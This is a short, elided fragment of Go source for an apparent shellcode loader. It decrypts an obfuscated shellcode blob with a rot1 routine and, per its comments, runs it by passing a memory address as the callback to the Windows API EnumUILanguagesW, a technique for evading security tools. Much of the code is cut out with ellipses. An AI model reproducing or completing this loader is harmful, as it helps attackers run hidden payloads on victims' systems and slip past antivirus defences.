...
func main() {
	...
	shellcode := rot1Decrypt(encShellcode)

	// Debugging: show size of shellcode
	...
	// call EnumUILanguagesW, passing the address of the allocated memory instead of the expected lpUILanguageEnumProc value
	...
	if err != nil {
		// If EnumUILanguagesW fails, print the error
		fmt.Println("EnumUILanguagesW failed:", err)
		return
	}
